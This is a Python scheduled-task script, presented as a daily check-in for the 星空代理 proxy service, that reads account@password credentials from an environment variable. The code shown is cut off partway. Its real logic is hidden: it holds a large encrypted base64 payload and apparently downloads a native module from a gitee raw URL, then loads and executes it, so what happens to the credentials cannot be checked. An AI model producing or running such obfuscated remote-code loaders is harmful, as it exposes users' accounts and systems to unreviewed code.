# name: 星空代理签到
# cron: 0 38 9 * * *
#环境变量XKDL，账号@密码多账号换行
import logging
import asyncio
import urllib.request
import platform
import sys
import os
from typing import Tuple, Optional, Dict, Callable, Set
from dataclasses import dataclass, field
from functools import wraps

@dataclass
class Config:
    SCRIPT_NAME: str = "xkdl"
    FUNCTION_NAME: str = "gogogo"
    DOWNLOAD_URL: str = "https://raw.giteeusercontent.com/kele2233/but/raw/ma/file"
    CODE_PAYLOADS: Dict[str, str] = field(default_factory=lambda: {
        "3.0": "fChSVFBhY2tAUkQyAQAAKtijzzXYZcciqf+GfDyRuQWIZlNYbTVwalduOWhXVzVpS2VjZWNVQ2ZTU1ZGTStFRC9aRWRqaTM1bjRnNnE3akViRjFNNmdoZCtMZnVtcmFmQy9pSUlLbEpkNzBRR3NaS3pzODhYTmlncml5TGo0R2JmL1lQRmx2aFFwSXhaTTNpZUthbmVaOHhtR0RRdldUbzUzVm9LUHNVZHJxSlBibHhIb0JJQ0g3QTJXUnQzTml2RTUvNWlzMDNBZ0ZqcDE2VzZrUENGUVN3NTNOQnllK1B3eWEzRURTYmVpN0l6WEw2ZEFsSzc0SVNyclNVZnU4MmpUUWx1UkhHVDZjNXduQWwyRlNiY2xYWWhBVkR1NWJPYkVBbnAzVnY1UmlKeVoxcitiM2U3dlYvSytUUXk0UlNnTmNla1ZJV1gydjRFUGxESDFwMUVLMWNkc0E1bFZHUTZvZWRnNDFQQmFhSGVLckRZUTdrU1ZzVG95VnNiSjRGRC9xcTN3VE1CZTArcE9mZE54RDZjbnVIc0ZudGhzL250N24xc01KV2NpNzhTNWwrZjRqUTNoNDYvdHNRZjFhc0VrY1l1VUdIWUZGcXY5TjlPdUxCeGJmT2tVc2tVRnAvaVBuWDR0V2NWWlFKME91RlU5bmhTQnhxVlpudmM3NlRST3pRYkZweXk4d2VHSWJsaWx6UmlWS1plSm1sRDR6NE5ENmhKYlhnc3d0bGcya0hIeFFvbnR1Si8yS01WdjBFM08zMldiVk1ISHorZVRNQk5DcVh0bFByaHB3T2tOYUtwQTFOMjU1R2lGVlFyOThNVnlHeVJsWnpVTUdFRHlBNlhYazY3MGVjajBHb0p3WXdSOXhEQVFLdzdENXVpTDNpM0p6cnpsV1Z3VWQycWU0bWJHZ2NXRkJqbXRlb3l1ZUJQU0hIOXE1aG0xNGU4M1VuMXArM1lUbXZydjNqY2Y0eDlSZUh5VmlqdHV1d0lGOUVCVGFKcjhDWU5UN2hWdnRqdUg5YTg3bE1hLzhjUThPTVdmOTlKSktmNUZFOE5PanZXeTN3L2tFZzZzcVdjZ1lERzJPY1VmUk45bzFYT0hvNjhIWXhhYmFuVG1keC9GUVZQLy9EM2VISStMaVR5cXQ1R3hjS2Zzd05waTN0d0FQN3laY2cveDU2THRGZGdPa0FnQ3VSRkNGZW4ycXlkMmNueEc1bVl1Ly9UMWZTYkl3Z0pieGJJMmFxQUtGQ08wSWp5ZU9mVHhaejR1ZXdDWGlrOWUrazByaTUwSjVuZEpWZzc3UjhEd0VjSkpaaUtZVVhqb1k4WEs2UDhOZEkzVGw5Vld4NmhaMEt1cXlWMEUrU1haanZGRi82TWgrbm83T3BpZkFXUHM4UTIzSlF2SEZuaTlYcWZRZWlrUFJPbmNJUUVMcVRuRjBwQlRhT1owYURCUDh6VERQWUhtbHdlSlNVVHcvYkE5UG14clcwZlVHN2NQajkzTlJJenpDZXExeHdXTXFGR2VsdjRVNGtsSUpnTXAzaDVnNlhQRDZMaEZUN0FoQWdYWDFpWFNPSkxXQWExWFR1Q3BSeEJrYWZQQTNOcGxxeWE4d0VCNzJOTkJXZnAvSmoxcGUwWU9ySW5zdjlYWTFFbHpCRy9QaTVxV0ZEb3J6eFlWTHBNYTlHYytzMHhYbXZEK3plNkM3RThQM1psYXhFMUxBa1FXeWxwL2wyQituaHhSMlNYbzZnVkFsQVJUVm5kOCtZZzkwRnRkWm56SUhrbGZuWS9hM24xdG9LRFRUQ0VGZVA4WkdsYzZYUkl4SVV3eE1tcnhLdUpmMVJkdlh6MXM4WUc0b2R2aG80WFdLNXBZRGJOUjJpTTZHM0NTMnUxcFlqVkxJUjJyL00wVmpsWlI4UnNvUVR2MFg1YU96d3ZoczVtYWo0M2RQNUpXS2U2QmsvY3BrbnpsdFIvdjE2T3hsWXg2bzl6L1lQUU8xSmN3dzZHV2lRNzRtaFFwcHBBcmxPL1kzeVVsUnZFTGpjR2ZTc0FUMUR4REdic0RxTlQyQllPN2dkSnF5Q2pCQ0JlZHBZaHRzOG5MSlBaWmtMOU5BRWlQUzRJLzduNUJMSEd4LzhkV1dmeWVJSEJuVitvL29idXhrNGwydnVTWHJtNlY0K2grSFdsc25ZTlJBZFFnc1Y2VUlweWlGc2pzSU9hQW1abzFHMzhKclJMcHlDMUpXRXNEOFpCbjVVOTJMN2xCVXFNdDJYOTY0bGxqWkVlZWMxUlo5c29YZEpFRUJ6ZmRreWNxRGNIeG1EWEN0Um5UQkZMbHdVeFg0ZFRKL0Y3NTd1Mnh2WktJVjVpMkRjakJFbHg5eVIyay95dE9oMm03WDhIT1dLUGN6Q212ZmRMUm14cHNiRnN2cGZVSGxjUlFSQ21MZ05td3hVQWpoQS8zQ1hhL2NXRnV4Ung3bjgzbHdPZVRnWmg0R3FhUGFIRzlEeTFIM2szYmY0cW93c0pHeWxzNFd0S1J0L1hKTkJJdGkraU9nSDRQcGdRQ3VEN0RmMmYrb1B6eWxsbllzejVKT1ZLalU4VXVSdmVXZE1DbEZWZWFtWGszeWJMNkU5RjVLQlhMSmxKTmxUSU9keGQwYjNDYXc1K2lBYlhBU2xtNHA2azNtOUc4SWwwL1o1Wjgyd2hQOTIxajMzTjZFMno4eGxXSEljMmdGNHlMRmxZc0xXWi9lWUNUSTk0N3NlRnhkcTI4NGlFQmpQTk5oTjJ5TlRJWlptMDJQRFBNdStDamlCNlNCSSt3a2JoNXFaVDNPSUVLWEVoNFJtV3Fieit0OTkzMUtwcnV1RzR2djV6L1ZJNlpPMmhGUWhhYzJHUlJiaVByWGwyN3VHRUtIWWF4OHpQYmJPdzh2VVZxNmNMeXM1em1FNHpPak1xbi9DcWNpcS9mMWRnKzhJTGk5bUYrbFRaeDhUUVpyK0VOS3d3cWxNQ1E0azJ4RGdIeWVjQWJBWTNRVHUyVE1NTis4M1VDOExUaUowYk5ERGZyUnBkeGxVUUFzNlZqVmhUb25Nd2pPU2hwU09ET2VxYUp6aEM5WDNvb0VTUFJsS0ppMElaZnFxeXJCRjhTR2pseVl1K2Qyd1lpUzU4U2R4ZXRicmozTUQ5d0N6M2ttYVkrZjRaaTJLMy9HN0hvYjFuNVhTZUxEVHNvaldJOFphdE5Cd21FVHU5VHN5c2lqWTlsdUFCdEVRSDcxL2labXdEU1VRMHhRYlFhSzJzcjRhUlZkZlRiUjVOR0ZRcFM4N0JISTRxS2lkT2FoNlpXTDhzU2J6RUlWSDUvbVhoV01VRm1NZDJRNUk1d3JUNXROdlJmaVd3ekhEbWtJVEFnc2l6SWxwVnQybUlUcnlab1pMbGZncEpybDJzMUVmNEVyeGtXTkFNU2YvclJFT0FxQXZ5N3FUQmF4U3lsUFlKOXhWclFxTlc1YjJrU1ZoVjZqWldMMisyZ1F6ZzMxZ0hPSHFuL3dlenp0OTV5VHBIL0hWdW5FVE5sc3ErN1l5MUxiVVIrbzJWN1BMQzZTL1JvMGdTVjg0anhuZUtTMlJzNTIxRFkrMWlGbzJoU1JNaUlpRHgrMlNxMnQ3MTlxZ1VTcTV0SE5MU3A0enJqQ2c2bE41TFVDM2lnZ0ZjY0FoSEJYVndrR1VGTGZGVFIxekhraEJnLzVQcW1iRkZnVVIvOUU2eHVHUjU5S0ZySktPSStyYVppcVZpclBCa1JtSDNDT3NRMklOWnQyNnAvc2U1TnhrbThVQnFVN1JCVDBkOFRNelNMQXR3anhaaFFFaFYzL2R4MUwrcDk4ZHdETXd3bGcxY2d2SU9qemhTVDhJVkpHdVBIWG81RjhXTDhWL2tHSG1SUmNEYUp6a2xuYlZlQ0E2a05CQzlpNFg4ZlZRWU83V01BSVBHVS90SnNvSFFwMWljSWN3NTB0amlDaTVueUdESHBwY1ZVL0NydlQ1bnZDYWhsZmZIYVNFaVFqZGZvcjFIejVvaFNuQzdpdVN2d053MUxZV2VEUzFuQktEVjl5bkEyUmVyY0xuK1AzNVFwaUhENFBsL2Uza05WYjZPcURNRVRDZE1INWNHVVp2VXhGQU00cFprOXFiWEczcXg1czVwTFZoOVNoYmRTbGJuYUNOdS8zZFJjQytGUEwrN2xBaVl2aUZsSEpuUnp1VVBHOHplbTBJSGZFbVUvaDNYc3F6Y3ZQMGxFU0hSd04vU1UwVXhiczl1QUhxUHp6MjN1RHlCNmNqWUVwYW5acjV5WUR2R0lPUFFvMXpTN1pZeHdkNHhwRFQ3WjFIOUlpT1lEVDRZQUlBNW5iMWQzajBFaVZrME02UmVCaUdLTEs1bkJTYU9MS21mdDNYSU1yV3RSbFdYQ21sMU9CTWxuRzVkdHJ1d2REZ0JkQmxDOGttZnl6MktvVng1bVpiWnQ2ZCtreVNRQlNKMlV5RXJaeTdCeURpSmJTeFFZT0xER3lEeUZyczhJc2NPekEyMWlFN2ZuR2plei9KTkVTMHhXVEd2OVVpbSt5YkpsVGFaUUVIQzA2YmltamFwSWdDWXM0K2kzUWJPN0tqSVNLTmRWSzJqY20vczY0WkltN2l4NTI5S0JNaldpYXZjak5qcGJRWHkxRVpGbDZZTkVZUGUwYStDWG1ISFVjaDJUUVpxZldqd09QdStwMmdCTjRwL0dMUkQvdVRRWjVCQmtYRW9XanY2RUhvcmJmTFNxWGJjN3pnRlBJeWJPZWt0L3JRT1RwWW5kUzE2TGJQa0RqYlg1eHEzZDBoKzZKaGlQN21XTHByc3FqaUdZaU0zZVNTbVQyemgweG81OW9pRUwzREliNmcyeWNYL2N0MHhERGREeWVoVHdaUjZHakttUVZVejFLRlMxQzkwa1FqbElJQlpCeGZVUzhTYklkV1FWdVIyUER1bkFscWhlSUVlaldYUXM5RnBBbWR2aDY5b0tTRkdGVnF1ZksycHJlVnk1V1ZUS0JsMG0zWmZjTmpLbEMyOXRGNGtBczByWitiU0tySWp6bnpCSHo4anRLZFJaK3ozTU1MOHZRcU9wY1V4K2Rkb2NJeUVpMVZYaUZ4Nm9GZ29rYW5BZkRrNHZXL1A0OVdSR1FWSnAyWkY5Q2QxbHE0L2MvQ0xSY1Zja0ZOVDUvKzlVV2hpZ0F1Um5sMEMxWno5UlBoQ1Z1Rk9HM29xNXhvMjZCY1lRaWJUZVZjNXJEWDVBVHpBeHVndVNwRFNWRHVtbndDZDloSFJLb3lmTVlIbnFaSmhOQnZxZ1k4Y2FjOVJZaDN0N2xFM1p0cXlCaDFrSzlDcFNCYnRFUmg5MEYzeHZnS0pBMGxSV2NNZXkzWlJxZU5uV09QbGFPb04rMUxvUldyaTR0UmtVY1UxUC9Zcm1SNzJTNEYxb1d6ZzY2OGRwTDQ2c3lvVUJ1TURMbTBSVlI1RStNb1FRRVEwUUNTSUFkOFdYTEFiTm9yZkpvVEFUK2x3MDExUGNPeDRHdGZFNTRCbGQzZ21mc2lFQjlDNEZZKzhuN0tQb3pKcEFMK2ZvbncwZUFjeE9qc3dDbU41Ri9odVJFRnVYYlNGR2Z5TFdZbjVKZC9pcHdCOFl6QlNrWWlLRW41Zng5N1dudzlqbjJNYjcvcHFubjF5WlBZSlo5YWtieU1GVzVYYmovZFNtb2dnT1puQWdibUxKZUU4amF6NmJ5MTZSTDhDTjRnNnFjTWpUa29zWU51MHBxZkVMN2dvc3QwRGJLckRBOU45NzRTb1c3R0RaVFNnL2JndTNOTllGME02RlZZOXVqRWw0dDkxaWkrcU5Ia1lsa0o5dDFkZkVJQmViMC9aSnR1cjRzRmtHMWJrdUQ3dmJzaTRCYzhiV2IxT0t5WWU0UTVPUTI1emVjb214OEllNy8rZS9VRHNqOHhrUk44Q0I2Ly9uVlNBTld4a3hibTlocUxUQXJmaXU5dFdpU2p5dHdPM1NMRHRyWDZMUnRTbzdaRXlDOE1BT3Y3VUE4K0FOSE81RmQyMmdSQWxud0MzcmxnRDRjYkVkNHpHQ29IcTBOTzFFR0oxTDZmMDFPcG1Iem8xK2pHbFpSanV6VzBNMndxSjIrSnJ5Ujl5SFl3eFYxZVd2RkZBQ1AvbWhJQTJQZEQzQitYcXF3Z2tiamxUNEx1T0ZyeEpCdDJNSXZQSVlmQ3NBck44dENwblJTZXRIYmg5RDF2OUk3RFRqc3FRY3RPZDh4MHZaRmZjQUdqQS9Hekx2SGpSZGQzN2I4a0ZnOG44R3NPZ3NucThUZERXU1RLejVtS095SmpoSytnMTIwOVZ5OW85NUFyZ2lmRHN3OC9jMWJtb0pHbXZPWUh1ZDA4eGQ1c1MzS0M2ODFraHE1ZjNxUVNOb2xiZWlVK09zbUZHdUpVYnF5U0YvcmRLY2J5eGswK2tXb1p6OUhDRWt2Z3YwNTlZQXE5QXV2Z3QyRnN1OTRyWmtPWmduL3V1bmZRanplN2NEbk1jQmRRUVc0RER6aHhmQVhlaCtKQlFIdDhGK3loVndxWndnSVpsREFsdjZSZnFuTUlYUjhwcHBXc0gwOThyZXIyOVpwVEpyTkhtSmtZaFlOSnlzaEVuS29ESmxoWC9SV0IzMHVoOE9LMVdCejF4Q25vM2RHTG92WmZoeko2M0pkZjYwdFB6VE5ndXlUMHVzblhZUS8vanVyOThIclhxdEdkN3NxMlRodHNJUTQrRGFMNWI0Q2ZCd1ozQ1BuRmtCbUFvZ3FDT2Q2K2FCdjRPeDdHVVh4dzkveEg2MWFEVzZiSzJ5bWVNdkJWMkphaEkvb2E1ZFlYa1Fmc1ZqbGNCbWdvQ0Q2MkN3Ny9CV1BtbW1TOVNnZzRjOUowcHEzUjhOWjBxK1ROb2xJVWFuVmRBZWhJWW5aSmptMElKT0ZicEJnbDVETXc3ZEF2NElEQ0E1UDUzV2xqd0dIeW56TENuVHpoNndnbGRPbWtXWkhXWVRYRzhzc3VOUmJBVTF4ZCsxU3A1b1ovYnJ3Tlg4Q3p2ZFpPVXozT0s4U3k3STZZSjFTZnN1enU0Tm0xVnB6Z1dMd04zMVVpbmEzVjd1UC9SY0NzbWc2WU1NaHM5NG56KzF2dmxYLzd5RjJzUFc2Mi9sQmVPZ2wyOFMzWklKODdBVDRTZDNVNmZHdVNGUFNnNjRiOXpyR1B1SWlOUUxSNG1KTEJ6U0l4MVhQRHZIdHNhWWlqdkpmN1ozSzlzZytEcWo3UmV5K08rM0l6UFMwR29DV1U1T2JxcXVVZnBSYkRodkdINnpjTk82d3VWY0NqU01oYzgrZGJkeVBndVN1VVpyaE1SdVN4UHNIeFBDOHg1Y3VsVDltaEtnOE42NXhGSUh5MUFmbkRmeXJiZDU2T0laVytTcWpnY1ZjRnRzcnlLRTBoMUpBS05nQUhlY3JIMU1PbVR1bHc2bEp1ZjNmdFV6WHFIanBza3QwVllZOXNxYXhiWEt3TnV6WlBkR3krYUY1Z25uM1Qzck1PR1V1aS9qbkNoRlB5UFRyRndtdEo5dzllMVY1YS9JT3pPempmVy9JUGFvSXA2dkhkWXBLWXVvUVQ5ZkliUkdvMjRLb1djdmc1ejdVY3BMQk1FcDlhQ20vSXQ3bFFZQXFoelRUdWdHbWVuRDJVdll2WTZtR2prWnV0QVk4dTFxRFM5VlBjU2lQYlpwbmJYa0RiMG5Id2JUMU5ESTF2czhVajJpdVcyMkJzZUE0S0RIZTlrS3I5M29oSkxKcG1TeEZzUkhpR2hZd3pVMmZMZ3J1dmJhdzZ0NEFqZWtLS1FqdVY2YjFyUFAvSFF0eCs5Q2F6RDdCa2kvMVlTN2lhYVVPd0w4WXFrQ1p0Njc3dFFYakIzVVJ3OG4xOWI0VEZ0TzhlVnRreWRKcE9vM2hjZ0hmM0VFK216WlFITVJ5ekk5RWpQQnAvTXNhcmEwUlM0cnl0MFFmcGhQZzZEZDBLN01ua0g2Z0w1TGtvcmxpRWZNL1NCVld2QXk5U002TjJsUWpIMGxTZGMvSnM1YkUzYkVpREgwT0IrYk45QStoWWJuWmxiczBTQ1Y2WWowYTgrK21nZHVvSXNxN1lKcTdrTW5yUURLOWFFM090SHN1OEFsSDFSc1BCcEM2aDB4UlpXbjd1OFNKUHBMY043NFVpaEhBemh2UW5TeFVSQUpMQlI2a1VYTmNpYjltMEFVU1c3Zkd5WWFrUkIwMytPKzZpbXFhd1FnNEJ1ZHB3NHB5MUdnblQzU3ZzTlF5OC9FcEpIcEplSmtjN1d4NENycDIwY0ZHRFJOMHNyZzdxRGZMZFA4ZzB6S0FDQjNmZ3daOFNMUVpsaEhONHVmaXRBb0pPZ01PY0hnS2ZNS0JXUUErZ0hSSGd1SWRwNHYvcmxMM2tzNEZXcEJCTEo4WExFem9pSE82SlI2anladDk2Zk45NEZwWWhxN2FtdHJManR4elJ3bS9mNlNOLy9walNYMjZJM0lyaFNnV3YxYmVjZXVIUklwM2VZWWo5ai9TV09zbis2TkJPc1FDYjB6N1JLTDJVOERzdDIyV2JNNG1acGF6Q0xRR0pDTS9JaTJ5ZDFDOXlkaklBaVJzUEpFRFVMY2tqa01HenQzWVFjd3JaNTA5S2ZmM1drKzhLUWRKMWN3VUprWktJaytkRXd0WjlxSnpCVHZuTTdrMzF1Z0lsT1JPclpwa05zaTY2NGdoeWpmNGxVc3lnRFRNNWZnTmdFY1dteUlaTE12T3VIMUdxNUZETE85SVhpUEtpblF5WDZYZW5zb2gwM2tiTjVvUXZwdzVEcUZqRHFnWUd4RmxqbU1RN21xRXR2a0ZNbkRsdStpeE1WNk5HMWtjajIvUUs4c2xmNFgxSFJmUFpUcmJPYTNzbE9td20zZDRUZWI3NWNNWUZFQUt1aTAxTzZ2N3laeXJzRGJLNnp0d3BpL3lBdVpldUwwVG01bCtnK3MrZUhhaHBiVnVNVHFtRmc3eVB5UXRFVDhtV2FsV2Nlc1A2SEpWZC8wUTV6TW0xWDVMQ2JMU2JHR0xDWmRQTk1KUStnUTcwcDVwNzZieXVRWGRVT0VqdTlkamdjQWFubFpvSyswNGxoZW1PQ3NTWFJwZWpvQmdhT0lod0tkblV5TzhYM3VKMDFDYSs4WWdGVHhTMkNqSy8xZGQyMjk1dG96WEVkd2Q4WlVlWTAxc0lMenVEUU1mVWpKOWRSdEdXZ2NTZGtlb0hGd0tsclFSQkVjMGVMTm9PaDNBVDRsK2h3SlY2bUs1d2tRUHhHcklkR1AvYmcyeWNJcDZsVTRDQWZWU1FIS1F3RXNQZ2tFTkd4WEtVOUlrVEFPSGt2eWRtU2RXWmJJc3RmaEMwakxyS0VKVmVpNmRMZTFVU3RJQ25CQ2FheFh6Uk9CczN0SFc2MFpJWUh4RjlIUmtVMElnUVNtSjYvNWNlSWJaaWcyUXVLNjUrNCtRT3ZMR3VYd2NEVTMrWGczSm83dFF3S2Y3UHc0V1dOaEFnZ0MrMGJMNEhXMkh2ZEtrNndTUHpndEdrNG5qdGJpaTUvRzBGcmdyd2Y1Z3ZtbUpvZ2RXaHJ6NEhNT0wxcVdhOWZSeDIzQUlKL0QwT09xU2ZQVjRpTitQQWdtNUZtelFENksrYVorSCsvdDNBeWdSOWwxOUxScmlFenh5SmFaa3FrMnA0ZnErVXdhTENWVjF1YW9nVlpXVUs0NTdJbGZpOEhFcU1iUTJZMjRtcldJaFJZSkNTOTdNVWxIM3FYYU5YTFpIK0dERSt3djNSOHlneGNSdGRPaXlYdkdKR0ZMNW4rV2VBWXRDN3ZtRU1RWjRjOWt4N2RacG5lWEhnUmU5N3V0MDRZODdLZkZUNlVUNXlrT3htRkdOUVhUTnpYSTBqMFpuYjVONXVGSDl4UHd4S3ljaXJhby9QMk1uVzVGcVNoTUxGbnZBcWhUdWx5QjRxNURvaWxiejJldGN0YWNockFlMGZITjRidis0NFUyZk9iRzErakhDVUJUb09TUEhqRWJhM3JoWlVuczRvMjV1akZPVGJMMTI3UmFkWU1vaGJNU2dTSFlqZWdDZjFxQXkrNVBtYkk1RkY5VUt1RDh3RjNycGcrNTRuQ2FuM2dyZnpYOFhiazl0T0RtdFQxNzJ0Z29QL0tZandYTytleVBVdGlLRFFTMmh4K1MvMG1WTzF4SlB4YTJ0eXZ2YjV4T2FSYmR2Mzd5akk4ekN2VTZTSUtncUVicmdCYng2andJOFJqYXZodEgzb1VhWkkxeTNySCthSXVBY3Iya0NuUnEva3FPaE8xSXhLU1ZZVXNhRHI0dG5WRm1hWXFOR096aE5DamRmZ3U5eFlPUjV4VlJMckNJLzZpOFZGZEY5QkRmV2RuOWVyMXVsSWJNS2tzN29BRXRYWFRkSDdRUTY0VDF5U1N6dlVjWDg2bEMyS3JaVVVNTjhKNDBQNmlxdDNwMzg1QmF3ZjNHeFJvS0Nmc05BaTVRTG9YbEtjSU5RdnFpZVFwMXRmR3V4dDVLOGR5UkJzWG9zSklUcU5odVpRVG81UzBpeGRDSEFNRTZCaXlhbXVjZzVSck03YmdsSUlKd0FQc3hheE9GbHRiL1hXRDhDcjdjWHppRFFxOGdqdGZXZ1lCVTFIUjdDc0JHNXRtK1JxVHFvdEdNSTRRLzVJcml3NStMOE1DWmJ3dHBjWU1sNmR0b2JSZUtiVUZCbUgvNHZpNTRjN0owbXg5b3UrZmFvRmxhSldlZlJ1VVVOSWh3MVNnTkI0cDZ1djJHOGRaVkNEZE9sMmFQbVRxYSthWFBPcmw2cUdVSjRhOHh5MmhJdTd4QURvYU5TUjdBSHlhc2hjOStDZ3VSOVZId2dTTjFVNldXZzk3bXFsVG5jZmRjWXZLRDdtM3hnUzFITGlHKzRMaTFBUGFJWXIydWhJeHRBOVNkWXlRc0JsSGxRMkxXVTRkcFBiVWF0VjYwbFFUWFFONklEczcvdk13bVBpazUydDNydzZ6bERmZ0JNMnZnY3hScVROL0p2OUR2QlN0ZXEwMDdGUXdBbGVibHo1eENVUG1CbFpsdlZZUVpZZWdFSlBldzFZVE1pS2p2dThRNVhqcEszZWJiWUJUUi81TWRMTExOTlBqVEE5SmM5QlUvM3JQaWtibWdzdjR0Vi9MY0dsUXhLUjY0endZR2R1Y1E1QmYzbldacmNuSU1TY2dDd2ZuMWMxeUpoWndnUnpCRVJyNmZlTitZVXpqUWNBTzBSQTNNRUcxRFF1RVFhV2ZjeU9KQXFqRkJaeHhIVHNkWS91ck5mN1pIZU5paTdKYndad0ZKcEFhWXgwUjZxSFhNL05mTk42a3o2Rm8vTnVOMjlWeEZLczBPR3JzUUk0dTRKSEphVzZodm1BODk5K2QvVWtjb0RFL0xkVURpV1VoQTgzd0xyZDZZNXVjbGVvd3JCOXVNTGF4V0N5dWlYS0JPcGVhUHhUaGo3alpnRHNBcDBXRE4yZ09wZGJkN2RjMHorUEZ4VUhrbHpoLzRTaDI1UHNYYjBUa1RqcUwzam5ENTZYdFFyTW9WWC9mUzZUOUtma0NPNW1QVGdkQVJMSU45cklyNzFpdVFlOWlKT1ZRSE9VblhWeFdEb2xuRkRyZEp1ZjI5R3crWFc5OEk1aFNsTGRGUEt5Y1BBZnFsZG9VNWM4ZXJZdzNLRWRKdzE4dndEMVRwaUU1RURvSlNtK1VDclFTSkpOK3VsbDkxbjlrYXM3RzFubFpsRWtJMDJ4V2pqRDFLekI1MXYxazRUYUJyOVhGek1Lc3dPcnpaOUdCL1ZlTWVuYnZPNDJnT0JoSTJ0UC9HUlhDVzFjcUpMc3Z6dWRaT2F3M1ROYU5meGIzM2FoSExqakppeERKbHh3enJ0NlBPd3dmdWRvY3JVYll0NzFRcit2cmwzOWh0RFQvM1ZJWG9hamJjZEZiZlZaZ0ZUeDh5c2hSa0JieXBKQ2VIR3VNVTZ4SUZkSDMxbHZhc1JrUzhsR0EzT1VVcDJPY3lncmFldWpsZGlyWWJmZ05aNi8zRGg1cXQ0Rk5jeWZVSkVHSVV5M3RvUG11bmdkbXJJTzNXaVUxeHNBNDRNcERjK29zRGlLV0UxN1AxekxoYjVIdGZLZ3lKWTJRZjFtVEZsU0RBNlNweTZjTHBuYklqeGM2bGx6cWo5K1VBQUh6ZnB4bUt1WEpXNUZGWDRLRGNiQnBncVBKNkVEcS9XdkdPdXRCVVJLdzg3QWpjQS9FbWdxSSswRVArWmJXZ1lISzU1djArdlpDMGJ2OGFMVXhOcmJ2ZU5nWTRWNk1hbjdRUlNKOGdwUkozUUduaG9WQzd6bmI3NUJiNkRJZkF0VXFRYWZET093enpHQVlKaUI2WlFWalZGeUsrLy9tQjNxdkw1SDBLcGlkdGw2WW4ya2tJdEJuQklQNHp0M2tBeENKcDF0bnVjVExsWFE2a3h3QmNLRGxLTVJIS2g3MjkwdURrdGRSRXBhYzFYNTBpQUx4R2tia1M1bFNVV0RXOUMzSXpBV3p3Zk1jbzhBT05kUEZ0L1V6bzZHV29BSmZSa2xFSUw0RzBua3l2aW9RYlZ3SDVqMGpOUFcyMVJWU292c1NmUmVrRS9TZCs1Skx2d1BiY3pJYzNseFE3TFlhVUYrSFR6U0h2TjlEMjdpdVh4cGhVd1lXdktmdXhtRmR4NEVFZjk1UVQvbXNIbkIwaWxtMUtydkp3LzJSUjhXQVpENW1uTmtKd3V2UGRaQU5tS3UzQmhINk16UjRuRkFJOE9ocXdwL1hpWFBXYk5KaTVxSHBML2RGdVBTQ3NFV2pWOGRpekI0L0gvZE16VDlnZ054d2dkRHhFcVJZQlFKWlBlbXhWUi9mcCtnS3FQd2d1ODJzaU5CVUROeElkUVRlRUc4RXRKemZ4T3RFV0hwZGVydStva1llN2hpSVZCclBucUhNRmRCOEpRS1h3TURJamV5ZnZ2TWcrTGJLbHJPdFdTV0E3c2lJcUtyK1lucWZ4NUladlB2WEdlY2h1Y3pBWDg0S3RFYzBodnY4T2pndFFKUFFhY3FxQWtGVHYzMzVjS1l1RGZqRjNyV3BZdGdrdi9Wb0JuMk95ZVBiRmszL2IzMTI3UXBHQnJxdndSYVlsWkk2YklWT08wR29oNUY0cGdlU0ZURzZrNWJIQmdqSzZtMVU4UFAvMTlvTllwL1dvSjlRNHlOeS93UVFvRHUzU2EvN3pjOHNJcndqd2l5Wmk5MStucFQveFRxNTljWWJaWFRhcWs3b09mamJsWHJJd2Mrb202TGRFRTV2Z2VrZTRvM3JiK0pLQkF5cU4rT1FHMlVHRzBzM00rOW9POHBBQWdrbG1vRTNyVy8yT0RTc0VqZUtpMm1iRDV2R2ttWlQ3K2REVlYxZ3VMM3IyZnRKMVQvdWNlOVlrNVV3RTFHSTZuaVo2VXkxWEVqSVNMZ3U5eWp3b2hIRFBVT0pUbHBEZHgwNFk5dkNDWGM3V2lOL3JUeE82YVg1K255ZXdUbVNVVDg5clRRTHRud0pyOThUb28zb2k5NG9qQmtVOHo2Qm1FdU9iUkJrbGkzejF4Qkp4U00xSkx5M1llZEluWEJUVkRPdjJsb01LMGdhZkRVQ3BteFpzcFhoN29GS3Z0L2E1VzFSQ1EvMWl4RHVYc0M0NXVXUERGOGlRb1p6ZVY5RXhtVVR1RzF2aVhxcTJjbzRUN29QckprQXkyU3A2MEtYei9FUGNPVlFnSWRMV2RIOVpjU05ta2F3ejl4akR1ZVJBTWV6S0U5NjlLZkcweTA2MmZMWG5DampvUHBOMjcxWXY3a1l4LzFNU1VwZ01rcnJxSE1oTDZybGJyNUNVTnhlNTh4MjRFT3pQMm9XV0hjWjNpb1NDQXJYL3VyTFNkOGFUK2pwMW1zdlB6WFFWSW04V3FEbjBROVVqYldZNEhjd0ZIS29RZ2VFa3JtdWtGN0hTN0x3ZjFYVjFsMy9oWFpMaGUvdjN3Y2MzbG4rTEVYeG5WWUp2L2VDUkIzTGo2elA1K3RqS0JYd01jZWRidFp5bjBibEcrTWE0Rmo5cVpFNUl4OEpaNERQRHpjTlJQRW9NYTlGU0tOYnkwWkI2TlRXQVRacXpVZzA5NWtrakkwWmV5V1B1Y0E5TWtFZkV5UTdEVTRqZG9GL1M4ekNRVW5MU3ZiNnREeElOV3kxd0ZVa1VaNlg1TUtYMlAvZHVFQnN3dzFxWHZ6akNGY1prVEdLLzlielVCYTZJTUczWUxadVA3aU51QmlIbEVKSkdrZVdJZndjWjRzVkRDRjh2MVJWTHZRTVJhY216NzhDcy9tejN2WHB4Y2Q3SVJlSG52c3JHclRxRnRCWXlyeTZVVWNacy83TTgxZEU2TXI5U0tsT3JnbFozOHJZQnl0Qmhub3grRWU4dVVEY0M3MDliMEhkL1NXVU13U1E2bHBDdkZpMHI2YXdxaytuVzdUc0s3K0lsUW1WNFh3U0hDNDdubXpWWi9pcXB3VzR1UmFONldZbkZtdXJEMlA1bHVqMlh4U0tGVEQvazcvWVg0d3hacXZ2aXJOeTV6TXhINXBUZkhnWUl2VSsraWk5Nk9uVzlXdVIwc0ZPRkFRL2FDa242OTd6VXhzQlVJOHMvUT09"
    })
    SUPPORTED_PYTHON_VERSIONS: Set[int] = field(default_factory=lambda: {10, 11, 12})
    SUPPORTED_OS: str = "Linux"
    SUPPORTED_ARCHITECTURES: Set[str] = field(default_factory=lambda: {'x86_64', 'aarch64', 'armv8', 'armv7l'})

    def download_url(self) -> str:
        return self.DOWNLOAD_URL

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

def _load_so(path):
    import importlib.util
    sys.modules.pop('nxloader', None)
    spec = importlib.util.spec_from_file_location('nxloader', path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules['nxloader'] = mod
    spec.loader.exec_module(mod)
    return mod

def handle_errors(func: Callable) -> Callable:
    @wraps(func)
    async def wrapper(*args, **kwargs):
        try:
            return await func(*args, **kwargs)
        except Exception:
            logger.error("脚本无法正常运行，请检测更换环境")
            sys.exit(1)
    return wrapper

def get_linux_distro() -> Tuple[str, str]:
    try:
        with open('/etc/os-release') as f:
